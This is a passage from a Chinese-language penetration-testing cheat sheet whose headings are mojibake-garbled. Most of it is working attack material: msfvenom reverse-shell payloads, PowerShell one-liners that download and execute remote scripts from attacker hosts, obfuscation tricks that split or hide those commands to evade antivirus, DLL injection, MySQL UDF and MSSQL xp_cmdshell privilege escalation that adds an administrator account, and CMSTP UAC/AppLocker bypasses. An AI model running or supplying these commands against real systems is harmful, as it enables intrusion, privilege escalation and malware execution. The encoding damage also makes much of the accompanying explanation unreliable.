&gt;go buildç”Ÿæˆexe
</code></pre>
<h3 id="åŠ è½½å™¨"><a href="#åŠ è½½å™¨" class="headerlink" title="åŠ è½½å™¨"></a>åŠ è½½å™¨</h3><h4 id="go-shellcode"><a href="#go-shellcode" class="headerlink" title="go-shellcode"></a>go-shellcode</h4><pre><code>https://github.com/brimstone/go-shellcode
è¿›å…¥cmd/scç›®å½•ç¼–è¯‘sc.exe
&gt;go build
</code></pre>
<p><img src="./img/98.png" alt="image"></p>
<pre><code>ç”Ÿæˆ
&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f hex -o shell.txt 
åŠ è½½å™¨åŠ è½½shellcode
&gt;sc.exe shellcode
</code></pre>
<p><img src="./img/99.png" alt="image"></p>
<h4 id="Gsl"><a href="#Gsl" class="headerlink" title="Gsl"></a>Gsl</h4><pre><code>https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/gsl-sc-loader.zip
&gt;gsl -s SHELLCODE -hex msfç”Ÿæˆhexæ ¼å¼
&gt;gsl -f shell.rawæœ¬åœ°åŠ è½½rawæ ¼å¼æ–‡ä»¶
&gt;gsl -f shell.hex -hex æœ¬åœ°åŠ è½½hexæ ¼å¼æ–‡ä»¶
&gt;gsl -u http://192.168.0.108/1.raw è¿œç¨‹åŠ è½½
&gt;gsl -u http://192.168.0.108/1.hex
</code></pre>
<h1 id="å†…ç½‘-amp-åŸŸ"><a href="#å†…ç½‘-amp-åŸŸ" class="headerlink" title="å†…ç½‘&amp;åŸŸ"></a>å†…ç½‘&amp;åŸŸ</h1><h2 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h2><pre><code>æŸ¥çœ‹ç‰ˆæœ¬$PSVersionTable
</code></pre>
<h3 id="è¿œç¨‹æ‰§è¡Œ"><a href="#è¿œç¨‹æ‰§è¡Œ" class="headerlink" title="è¿œç¨‹æ‰§è¡Œ"></a>è¿œç¨‹æ‰§è¡Œ</h3><pre><code>&gt;powershell -nop -w hidden -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;&#39;);Invoke-xxx&quot;
</code></pre>
<p><img src="./img/100.png" alt="image"></p>
<h3 id="åŠ è½½exe"><a href="#åŠ è½½exe" class="headerlink" title="åŠ è½½exe"></a>åŠ è½½exe</h3><pre><code>msfvenomç”Ÿæˆexeæœ¨é©¬
#msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444 -f exe &gt; /var/www/html/1.exe  
ä½¿ç”¨powersploitçš„Invoke-ReflectivePEInjection.ps1è„šæœ¬
#powershell.exe -w hidden -exec bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/clymberps/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1&#39;);Invoke-ReflectivePEInjection -PEUrl http://192.168.0.107/1.exe -ForceASLR&quot; 
</code></pre>
<h3 id="EXE2PS1"><a href="#EXE2PS1" class="headerlink" title="EXE2PS1"></a>EXE2PS1</h3><pre><code>http://192.168.0.107/ps/powersploit/CodeExecution/Convert-BinaryToString.ps1
å°†exeè½¬æ¢ä¸ºbase64
&gt;Import-Module .\Convert-BinaryToString.ps1
&gt;Convert-BinaryToString -FilePath .\ms15051.exe
</code></pre>
<p><img src="./img/101.png" alt="image"></p>
<pre><code>http://192.168.0.107/ps/powersploit/CodeExecution/Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection.ps1æ–‡ä»¶å¤´éƒ¨æ·»åŠ 
Function MS15051&#123;
&lt;#
.SYNOPSIS    
.EXAMPLE
C:\PS&gt; MS15051 -Command &quot;whoami&quot;
#&gt;
 [CmdletBinding()]
    param(
        [Parameter(Mandatory = $False)]
        [string]
        $Command
  )
$InputString = &quot;æ–‡ä»¶çš„base64ç¼–ç &quot;
$PEBytes = [System.Convert]::FromBase64String($InputString)
æ–‡ä»¶å°¾éƒ¨æ·»åŠ 
write-host (&quot;[+] Executing Command: &quot;+$Command)  -foregroundcolor &quot;Green&quot;
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs $Command 
write-host (&quot;[+] Done !&quot;)  -foregroundcolor &quot;Green&quot;
&#125;
</code></pre>
<p><img src="./img/102.png" alt="image"></p>
<pre><code>è¿œç¨‹ä¸‹è½½æ‰§è¡Œ
&gt;powershell -nop -w hidden -ep bypass &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;http://192.168.0.107/ps/powersploit/CodeExecution/ms15051.ps1&#39;); MS15051 â€“Command \&quot;whoami\&quot;&quot;
</code></pre>
<p><img src="./img/103.png" alt="image"></p>
<h3 id="ç»•è¿‡ç­–ç•¥"><a href="#ç»•è¿‡ç­–ç•¥" class="headerlink" title="ç»•è¿‡ç­–ç•¥"></a>ç»•è¿‡ç­–ç•¥</h3><pre><code>&gt;powershell Set-ExecutionPolicy Unrestrictedéœ€ç®¡ç†å‘˜æƒé™ï¼Œä¸å—é™æ‰§è¡Œ
&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-xxx.ps1&#39;);invoke-xxx&quot;
&gt;powershell -exec bypass -File ./a.ps1&amp;&gt;Import-Module xxx
</code></pre>
<h4 id="Base64-1"><a href="#Base64-1" class="headerlink" title="Base64"></a>Base64</h4><pre><code>&gt;use exploit/multi/script/web_delivery|target=2(PSH)
&amp;
&gt;cat payload.txt | iconv --to-code UTF-16LE |base64
&gt;powershell -ep bypass -enc base64code
</code></pre>
<h4 id="å†™å…¥batç»•è¿‡"><a href="#å†™å…¥batç»•è¿‡" class="headerlink" title="å†™å…¥batç»•è¿‡"></a>å†™å…¥batç»•è¿‡</h4><pre><code>powershell -exec bypass -File ./a.ps1 
å°†è¯¥å‘½ä»¤ä¿å­˜ä¸ºc.bat
</code></pre>
<h4 id="æ‹¼æ¥æ‹†åˆ†å­—ç¬¦ä¸²"><a href="#æ‹¼æ¥æ‹†åˆ†å­—ç¬¦ä¸²" class="headerlink" title="æ‹¼æ¥æ‹†åˆ†å­—ç¬¦ä¸²"></a>æ‹¼æ¥æ‹†åˆ†å­—ç¬¦ä¸²</h4><pre><code>powershell.exe  
&quot;
$c1=&#39;powershell -c IEX&#39;; 
$c2=&#39;(New-Object Net.WebClient).Downlo&#39;; 
$c3=&#39;adString(&quot;http://192.168.197.192/a.ps1&quot;)&#39;; 
echo ($c1,$c2,$c3) 
&quot; 
å…ˆå°†å‘½ä»¤æ‹†åˆ†ä¸ºå­—ç¬¦ä¸²ï¼Œç„¶åè¿›è¡Œæ‹¼æ¥ã€‚echoä¿®æ”¹ä¸ºIEXæ‰§è¡Œã€‚
powershell $c2=&#39;IEX (New-Object Net.WebClient).Downlo&#39;;$c3=&#39;adString(&#39;&#39;http://x.x.x.x/a&#39;&#39;)&#39;; $Text=$c2+$c3; IEX(-join $Text)
</code></pre>
<h4 id="Replaceæ›¿æ¢å‡½æ•°"><a href="#Replaceæ›¿æ¢å‡½æ•°" class="headerlink" title="Replaceæ›¿æ¢å‡½æ•°"></a>Replaceæ›¿æ¢å‡½æ•°</h4><pre><code>powershell -noexit &quot;$c1=&#39;IEX(New-Object Net.WebClient).Downlo&#39;;$c2=&#39;123(&#39;&#39;http://192.168.0.108/1.ps1&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX ($c1+$c2)&quot; 
</code></pre>
<h4 id="HTTPå­—ç¬¦æ‹¼æ¥ç»•è¿‡"><a href="#HTTPå­—ç¬¦æ‹¼æ¥ç»•è¿‡" class="headerlink" title="HTTPå­—ç¬¦æ‹¼æ¥ç»•è¿‡"></a>HTTPå­—ç¬¦æ‹¼æ¥ç»•è¿‡</h4><pre><code>ä¹Ÿå¯ä»¥å¯¹httpå­—ç¬¦è¿›è¡Œç»•è¿‡ï¼ŒåŒæ ·å¯ä»¥bypass
powershell &quot;$a=&#39;IEX((new-object net.webclient).downloadstring(&quot;ht&#39;;$b=&#39;tp://192.168.197.192/a.ps1&quot;))&#39;;IEX ($a+$b)&quot;  
</code></pre>
<h4 id="å›¾ç‰‡å…æ€"><a href="#å›¾ç‰‡å…æ€" class="headerlink" title="å›¾ç‰‡å…æ€"></a>å›¾ç‰‡å…æ€</h4><pre><code>é€šè¿‡å›¾ç‰‡å…æ€æ‰§è¡Œpowershellçš„è„šæœ¬Invoke-PSImage.ps1ï¼Œä¸»è¦æŠŠpayloadåˆ†æ•£å­˜åˆ°å›¾ç‰‡çš„åƒç´ ä¸­,æœ€ååˆ°è¿œç«¯æ‰§è¡Œæ—¶,å†é‡æ–°éå†é‡ç»„åƒç´ ä¸­çš„payloadæ‰§è¡Œã€‚
https://github.com/peewpw/Invoke-PSImage
1900*1200çš„å›¾ç‰‡x.jpgã€‚
C:\&gt;powershell 
PS C:\&gt; Import-Module .\Invoke-PSImage.ps1 
PS C:\&gt; Invoke-PSImage -Script .\a.ps1 -Image .\x.jpg -Out .\reverse_shell.png -Web 
a.ps1æ˜¯msfæœ¨é©¬ï¼Œ-Out ç”Ÿæˆreverse_shell.pngå›¾ç‰‡ï¼Œ-Web è¾“å‡ºä»webè¯»å–çš„å‘½ä»¤ã€‚
å°†reverse_shell.pngç§»åŠ¨è‡³webç›®å½•ï¼Œæ›¿æ¢urlåœ°å€ã€‚åœ¨powershellä¸‹æ‰§è¡Œå³å¯ã€‚
</code></pre>
<h4 id="åŠ è½½shellcode"><a href="#åŠ è½½shellcode" class="headerlink" title="åŠ è½½shellcode"></a>åŠ è½½shellcode</h4><pre><code>msfvenomç”Ÿæˆè„šæœ¬æœ¨é©¬
#msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.72.164 LPORT=4444 -f powershell -o /var/www/html/test  
åœ¨windowsé¶æœºä¸Šè¿è¡Œä¸€ä¸‹å‘½ä»¤
PS &gt;IEX(New-Object Net.WebClient).DownloadString(&quot;http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&quot;) 
PS &gt;IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.72.164/test&quot;) 
Invoke-Shellcode -Shellcode $buf -Force  è¿è¡Œæœ¨é©¬ 
ä½¿ç”¨Invoke-Shellcode.ps1è„šæœ¬æ‰§è¡Œshellcode
å³å¯åå¼¹meterpreter shell
</code></pre>
<h4 id="åŠ è½½dll"><a href="#åŠ è½½dll" class="headerlink" title="åŠ è½½dll"></a>åŠ è½½dll</h4><pre><code>ä½¿ç”¨msfvenom ç”Ÿæˆdllæœ¨é©¬è„šæœ¬
&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.72.164 lport=4444 -f dll -o /var/www/html/test.dll 
å°†ç”Ÿæˆçš„dllä¸Šä¼ åˆ°ç›®æ ‡çš„Cç›˜ã€‚åœ¨é¶æœºä¸Šæ‰§è¡Œä»¥ä¸‹å‘½ä»¤
PS &gt;IEX(New-Object Net.WebClient).DownloadString(&quot;http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-DllInjection.ps1&quot;) 
Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden  
åˆ›å»ºæ–°çš„è¿›ç¨‹å¯åŠ¨è®°äº‹æœ¬ï¼Œå¹¶è®¾ç½®ä¸ºéšè—
Invoke-DllInjection -ProcessID xxx -Dll c:\test.dll ä½¿ç”¨notepadçš„PID  
Msf
#use exploit/multi/handler
#set payload windows/x64/meterpreter/reverse_tcp
#run
</code></pre>
<h2 id="Windowså®‰å…¨æ ‡è¯†ç¬¦-SID"><a href="#Windowså®‰å…¨æ ‡è¯†ç¬¦-SID" class="headerlink" title="Windowså®‰å…¨æ ‡è¯†ç¬¦(SID)"></a>Windowså®‰å…¨æ ‡è¯†ç¬¦(SID)</h2><table>
<thead>
<tr>
<th>ç›¸å¯¹æ ‡è¯†ç¬¦</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>500</td>
<td>ç®¡ç†å‘˜</td>
</tr>
<tr>
<td>501</td>
<td>æ¥å®¾</td>
</tr>
<tr>
<td>502</td>
<td>å¯†é’¥åˆ†å‘ä¸­å¿ƒæœåŠ¡çš„æœåŠ¡è´¦æˆ·</td>
</tr>
<tr>
<td>512</td>
<td>åŸŸç®¡ç†å‘˜</td>
</tr>
<tr>
<td>513</td>
<td>åŸŸç”¨æˆ·</td>
</tr>
<tr>
<td>514</td>
<td>åŸŸæ¥å®¾</td>
</tr>
<tr>
<td>515</td>
<td>åŸŸè®¡ç®—æœº</td>
</tr>
<tr>
<td>516</td>
<td>åŸŸæ§åˆ¶å™¨</td>
</tr>
<tr>
<td>544</td>
<td>å†…ç½®ç®¡ç†å‘˜</td>
</tr>
<tr>
<td>519</td>
<td>ä¼ä¸šç®¡ç†å‘˜</td>
</tr>
</tbody></table>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><h3 id="Impacketå·¥å…·åŒ…"><a href="#Impacketå·¥å…·åŒ…" class="headerlink" title="Impacketå·¥å…·åŒ…"></a>Impacketå·¥å…·åŒ…</h3><pre><code>https://github.com/maaaaz/impacket-examples-windows
https://github.com/SecureAuthCorp/impacket
#git clone https://github.com/CoreSecurity/impacket.git 
#cd impacket/ 
#python setup.py install
</code></pre>
<h3 id="Windows-exploit-suggester"><a href="#Windows-exploit-suggester" class="headerlink" title="Windows-exploit-suggester"></a>Windows-exploit-suggester</h3><pre><code>#pip install xlrd --upgrade
#./windows-exploit-suggester.py --update
#./windows-exploit-suggester.py --database 20xx-xx-xx-mssb.xlsx --systeminfo systeminfo.txt
</code></pre>
<h3 id="Wesng"><a href="#Wesng" class="headerlink" title="Wesng"></a>Wesng</h3><pre><code>https://github.com/bitsadmin/wesng
&gt;systeminfo &gt;1.txt
&gt;python wes.py 1.txt
</code></pre>
<p><img src="./img/104.png" alt="image"></p>
<h3 id="Searchsploit"><a href="#Searchsploit" class="headerlink" title="Searchsploit"></a>Searchsploit</h3><pre><code>ä½¿ç”¨æ–¹æ³•
&gt;searchsploit è½¯ä»¶ ç‰ˆæœ¬
æŸ¥æ‰¾å¸¸è§è¡¥ä¸
https://bugs.hacking8.com/tiquan/
http://get-av.se7ensec.cn/index.php
https://patchchecker.com/checkprivs/
wmicæŸ¥è¯¢è¡¥ä¸
wmic qfe list full|findstr /i hotfix
systeminfo&gt;temp.txt&amp;(for %i in (KB2271195 KB2124261 KB2160329 KB2621440  KB2707511 KB2829361 KB2864063 KB3000061 KB3045171 KB3036220 KB3077657 KB3079904 KB3134228 KB3124280 KB3199135) do @type temp.txt|@find /i  &quot;%i&quot;|| @echo %i Not Installed!)&amp;del /f /q /a temp.txt
MS17-017 [KB4013081] [GDI Palette Objects Local Privilege Escalation] (windows 7/8) 
CVE-2017-8464 [LNK Remote Code Execution Vulnerability] (windows 10/8.1/7/2016/2010/2008) 
CVE-2017-0213 [Windows COM Elevation of Privilege Vulnerability] (windows 10/8.1/7/2016/2010/2008) 
MS17-010 [KB4013389] [Windows Kernel Mode Drivers] (windows 7/2008/2003/XP) 
MS16-135 [KB3199135] [Windows Kernel Mode Drivers] (2016) 
MS16-111 [KB3186973] [kernel api] (Windows 10 10586 (32/64)/8.1) 
MS16-098 [KB3178466] [Kernel Driver] (Win 8.1) 
MS16-075 [KB3164038] [Hot Potato] (2003/2008/7/8/2012) 
MS16-034 [KB3143145] [Kernel Driver] (2008/7/8/10/2012) 
MS16-032 [KB3143141] [Secondary Logon Handle] (2008/7/8/10/2012) 
MS16-016 [KB3136041] [WebDAV] (2008/Vista/7) 
MS15-097 [KB3089656] [remote code execution] (win8.1/2012) 
MS15-076 [KB3067505] [RPC] (2003/2008/7/8/2012) 
MS15-077 [KB3077657] [ATM] (XP/Vista/Win7/Win8/2000/2003/2008/2012) 
MS15-061 [KB3057839] [Kernel Driver] (2003/2008/7/8/2012) 
MS15-051 [KB3057191] [Windows Kernel Mode Drivers] (2003/2008/7/8/2012) 
MS15-010 [KB3036220] [Kernel Driver] (2003/2008/7/8) 
MS15-015 [KB3031432] [Kernel Driver] (Win7/8/8.1/2012/RT/2012 R2/2008 R2) 
MS15-001 [KB3023266] [Kernel Driver] (2008/2012/7/8) 
MS14-070 [KB2989935] [Kernel Driver] (2003) 
MS14-068 [KB3011780] [Domain Privilege Escalation] (2003/2008/2012/7/8) 
MS14-058 [KB3000061] [Win32k.sys] (2003/2008/2012/7/8) 
MS14-040 [KB2975684] [AFD Driver] (2003/2008/2012/7/8) 
MS14-002 [KB2914368] [NDProxy] (2003/XP) 
MS13-053 [KB2850851] [win32k.sys] (XP/Vista/2003/2008/win 7) 
MS13-046 [KB2840221] [dxgkrnl.sys] (Vista/2003/2008/2012/7) 
MS13-005 [KB2778930] [Kernel Mode Driver] (2003/2008/2012/win7/8) 
MS12-042 [KB2972621] [Service Bus] (2008/2012/win7) 
MS12-020 [KB2671387] [RDP] (2003/2008/7/XP) 
MS11-080 [KB2592799] [AFD.sys] (2003/XP) 
MS11-062 [KB2566454] [NDISTAPI] (2003/XP) 
MS11-046 [KB2503665] [AFD.sys] (2003/2008/7/XP) 
MS11-011 [KB2393802] [kernel Driver] (2003/2008/7/XP/Vista) 
MS10-092 [KB2305420] [Task Scheduler] (2008/7) 
MS10-065 [KB2267960] [FastCGI] (IIS 5.1, 6.0, 7.0, and 7.5) 
MS10-059 [KB982799] [ACL-Churraskito] (2008/7/Vista) 
MS10-048 [KB2160329] [win32k.sys] (XP SP2 &amp; SP3/2003 SP2/Vista SP1 &amp; SP2/2008 Gold &amp; SP2 &amp; R2/Win7) 
MS10-015 [KB977165] [KiTrap0D] (2003/2008/7/XP) 
MS10-012 [KB971468] [SMB Client Trans2 stack overflow] (Windows 7/2008R2) 
MS09-050 [KB975517] [Remote Code Execution] (2008/Vista) 
MS09-020 [KB970483] [IIS 6.0] (IIS 5.1 and 6.0) 
MS09-012 [KB959454] [Chimichurri] (Vista/win7/2008/Vista) 
MS08-068 [KB957097] [Remote Code Execution] (2000/XP) 
MS08-067 [KB958644] [Remote Code Execution] (Windows 2000/XP/Server 2003/Vista/Server 2008) 
MS08-066 [] [] (Windows 2000/XP/Server 2003) 
MS08-025 [KB941693] [Win32.sys] (XP/2003/2008/Vista) 
MS06-040 [KB921883] [Remote Code Execution] (2003/xp/2000) 
MS05-039 [KB899588] [PnP Service] (Win 9X/ME/NT/2000/XP/2003)
MS03-026 [KB823980] [Buffer Overrun In RPC Interface] (/NT/2000/XP/2003)
</code></pre>
<h3 id="æ¿€æ´»guest"><a href="#æ¿€æ´»guest" class="headerlink" title="æ¿€æ´»guest"></a>æ¿€æ´»guest</h3><pre><code>&gt;net user guest /active:yes
</code></pre>
<h3 id="MYSQL-udf"><a href="#MYSQL-udf" class="headerlink" title="MYSQL udf"></a>MYSQL udf</h3><pre><code>Udf: sqlmap-master\udf\mysql\windows\
&gt;python sqlmap/extra/cloak/cloak.py lib_mysqludf_sys.dll _ 
Mysql&gt;5.1 udf.dllæ”¾ç½®åœ¨lib\plugin 
Mysql&lt;5.1 udf.dllæ”¾ç½®åœ¨c:\windows\system32
#show variables like &#39;%compile%&#39;; æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬
#select @@plugin_dir æŸ¥çœ‹æ’ä»¶ç›®å½•
æ”¾å…¥udf
#select load_file(&#39;\\\\192.168.0.19\\network\\lib_mysqludf_sys_64.dll&#39;) into dumpfile &quot;D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll&quot;; 
æˆ–å°†udfåå…­è¿›åˆ¶ç¼–ç åå†™å…¥
#select hex(load_file(&#39;udf_sys_64.dll&#39;)) into dumpfile &#39;/tmp/udf.hex&#39;; 
#select 0x4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000000000000000000â€¦ into dump file &quot;D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll&quot;;
æˆ–å°†udf base64ç¼–ç åå†™å…¥(MySQL 5.6.1å’ŒMariaDB 10.0.5)
#select to_base64(load_file(&#39;/usr/udf.dll&#39;)) into dumpfile &#39;/tmp/udf.b64&#39;;
#select from_base64(â€œxxxxxâ€) into dumpfile &quot;D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll&quot;;
æˆ–åˆ›å»ºè¡¨æ‹¼æ¥åå…­è¿›åˆ¶ç¼–ç 
#create table temp(data longblob); 
#insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d); 
#update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b3); 
#select data from temp into dump file &quot;D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll&quot;;
æˆ–#insert into temp(data) values(hex(load_file(&#39;D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll&#39;)));
#SELECT unhex(cmd) FROM mysql.temp INTO DUMPFILE &#39;D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll &#39;;
æˆ–ä½¿ç”¨å¿«é€Ÿå¯¼å…¥æ•°æ®
#load data infile &#39;\\\\192.168.0.19\\network\\udf.hex&#39;
#into table temp fields terminated by &#39;@OsandaMalith&#39; lines terminated by &#39;@OsandaMalith&#39; (data); 
#select unhex(data) from temp into dumpfile &#39;D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll&#39;;
åˆ›å»ºå‡½æ•°
#create function cmdshell returns string soname &#39;udf.dll&#39;;
#create function sys_exec returns int soname &#39;udf.dll&#39;;
æ‰§è¡Œå‘½ä»¤
#select cmdshell(&#39;whoami&#39;); 
#select sys_exec(&#39;&#39;whoami&#39;&#39;); 
åˆ é™¤å‡½æ•°
#drop function cmdshell;
#drop function sys_exec;
</code></pre>
<h3 id="MYSQL-Linux-Root"><a href="#MYSQL-Linux-Root" class="headerlink" title="MYSQL Linux Root"></a>MYSQL Linux Root</h3><pre><code>https://0xdeadbeef.info/exploits/raptor_udf2.c
$ gcc -g -c raptor_udf2.c
$ gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
$ mysql -u root -p
mysql&gt; use mysql;
mysql&gt; create table foo(line blob);
mysql&gt; insert into foo values(load_file(&#39;/home/raptor/raptor_udf2.so&#39;));
mysql&gt; select * from foo into dumpfile &#39;/usr/lib/raptor_udf2.so&#39;;
mysql&gt; create function do_system returns integer soname &#39;raptor_udf2.so&#39;;
mysql&gt; select * from mysql.func;
</code></pre>
<table>
<thead>
<tr>
<th>name</th>
<th>ret</th>
<th>dl</th>
<th>type</th>
</tr>
</thead>
<tbody><tr>
<td>do_system</td>
<td>2</td>
<td>raptor_udf2.so</td>
<td>function</td>
</tr>
</tbody></table>
<pre><code>mysql&gt; select do_system(&#39;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#39;);
mysql&gt; \! sh
sh-2.05b$ cat /tmp/out
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
</code></pre>
<h3 id="MSSQL-4"><a href="#MSSQL-4" class="headerlink" title="MSSQL"></a>MSSQL</h3><pre><code>å¼€å¯xp_cmdshell
</code></pre>
<h4 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h4><pre><code>#exec sp_configure &#39;show advanced options&#39;, 1;reconfigure; 
#exec sp_configure &#39;xp_cmdshell&#39;,1;reconfigure;
#exec master.dbo.xp_cmdshell &#39;ipconfig&#39;
</code></pre>
<h4 id="xp-regwrite"><a href="#xp-regwrite" class="headerlink" title="xp_regwrite"></a>xp_regwrite</h4><pre><code>xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#39;,&#39;debugger&#39;,&#39;reg_sz&#39;,&#39;c:\windows\system32\taskmgr.exe&#39;
</code></pre>
<h4 id="xp-dirtree"><a href="#xp-dirtree" class="headerlink" title="xp_dirtree"></a>xp_dirtree</h4><pre><code>execute master..xp_dirtree &#39;c:&#39; //åˆ—å‡ºæ‰€æœ‰c:\æ–‡ä»¶å’Œç›®å½•,å­ç›®å½• 
execute master..xp_dirtree &#39;c:&#39;,1 //åªåˆ—c:\æ–‡ä»¶å¤¹ 
execute master..xp_dirtree &#39;c:&#39;,1,1 //åˆ—c:\æ–‡ä»¶å¤¹åŠ æ–‡ä»¶ 
</code></pre>
<h4 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h4><pre><code>exec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;
exec sp_configure &#39;Ola Automation Procedures&#39; , 1;RECONFIGURE;
æ‰§è¡Œå‘½ä»¤
declare @shell int 
exec sp_oacreate &#39;wscript.shell&#39;,@shell output 
exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c net user 123 123 /add&#39;
declare @shell int 
exec sp_oacreate &#39;wscript.shell&#39;,@shell output 
exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c net localgroup administrators 123/add&#39;
åˆ é™¤æ–‡ä»¶
declare @result int
declare @fso_token int
exec sp_oacreate &#39;scripting.filesystemobject&#39;, @fso_token out
exec sp_oamethod @fso_token,&#39;deletefile&#39;,null,&#39;c:\1.txt&#39;
exec sp_oadestroy @fso_token
å¤åˆ¶æ–‡ä»¶
declare @o int
exec sp_oacreate &#39;scripting.filesystemobject&#39;,@o out
exec sp_oamethod @o,&#39;copyfile&#39;,null,&#39;c:\1.txt&#39;,&#39;c:\2.txt&#39;
ç§»åŠ¨æ–‡ä»¶
declare @o int
exec sp_oacreate &#39;scripting.filesystemobject&#39;,@o out
exec sp_oamethod @o,&#39;movefile&#39;,null,&#39;c:\1.txt&#39;,&#39;c:\2.txt&#39;
</code></pre>
<h4 id="æ²™ç›’æ‰§è¡Œ"><a href="#æ²™ç›’æ‰§è¡Œ" class="headerlink" title="æ²™ç›’æ‰§è¡Œ"></a>æ²™ç›’æ‰§è¡Œ</h4><pre><code>å¼€å¯æ²™ç›’ï¼š
&gt;exec master..xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;,&#39;SandBoxMode&#39;,&#39;REG_DWORD&#39;,1
æ‰§è¡Œï¼š
&gt;select * from openrowset(&#39;microsoft.jet.oledb.4.0&#39;,&#39;;database=c:\windows\system32\ias\dnary.mdb&#39;,&#39;select shell(&quot;whoami&quot;)&#39;)
</code></pre>
<h4 id="WarSQLKit-åé—¨"><a href="#WarSQLKit-åé—¨" class="headerlink" title="WarSQLKit(åé—¨)"></a>WarSQLKit(åé—¨)</h4><pre><code>http://eyupcelik.com.tr/guvenlik/493-mssql-fileless-rootkit-warsqlkit
</code></pre>
<h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><pre><code>å‘ç°è¡¥ä¸
#use post/windows/gather/enum_patches
åˆ—ä¸¾å¯ç”¨EXP
#use post/multi/recon/local_exploit_suggester
</code></pre>
<h3 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h3><h4 id="MSF-1"><a href="#MSF-1" class="headerlink" title="MSF"></a>MSF</h4><pre><code>&gt;use exploit/windows/local/bypassuac 
&gt;use exploit/windows/local/bypassuac_injection
&gt;use exploit/windows/local/bypassuac_vbs
&gt;use exploit/windows/local/bypassuac_fodhelper
&gt;use exploit/windows/local/bypassuac_eventvwr
&gt;use exploit/windows/local/bypassuac_comhijack
</code></pre>
<h4 id="DccwBypassUAC"><a href="#DccwBypassUAC" class="headerlink" title="DccwBypassUAC"></a>DccwBypassUAC</h4><pre><code>Use on win10&amp;win8
</code></pre>
<p><img src="./img/105.png" alt="image"></p>
<h4 id="K8uac"><a href="#K8uac" class="headerlink" title="K8uac"></a>K8uac</h4><pre><code>&gt;k8uac.exe xx.exe
&gt;k8uac.exe &quot;command&quot;
</code></pre>
<h4 id="CMSTP"><a href="#CMSTP" class="headerlink" title="CMSTP"></a>CMSTP</h4><pre><code>è®¾ç½®UACå’ŒApplockerè§„åˆ™
</code></pre>
<p><img src="./img/106.png" alt="image"><br><img src="./img/107.png" alt="image"><br><img src="./img/108.png" alt="image"><br><img src="./img/109.png" alt="image"></p>
<pre><code>MSFç”Ÿæˆæ¶æ„DLLä¼ å…¥é¶æœº
&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -f dll -o /var/www/html/cm.dll
</code></pre>
<p><img src="./img/110.png" alt="image"></p>
<pre><code>DLLåŒç›®å½•ä¸‹å»ºç«‹run.infï¼ŒRegisterOCXSectionæŒ‡å®šdllä½ç½®ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šè¿œç¨‹webdav
å¦‚ï¼š\\192.168.0.107\webdav\cm.dll
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall_SingleUser]
RegisterOCXs=RegisterOCXSection
[RegisterOCXSection]
C:\Users\y.SUB2K8\Desktop\cm.dll
[Strings]
AppAct = &quot;SOFTWARE\Microsoft\Connection Manager&quot;
ServiceName=&quot;cmstp&quot;
ShortSvcName=&quot;cmstp&quot;
æ‰§è¡Œå‘½ä»¤å¯ç»•è¿‡UACå’ŒApplockerä¸Šçº¿
&gt;cmstp /s run.inf
</code></pre>
<p><img src="./img/111.png" alt="image"></p>
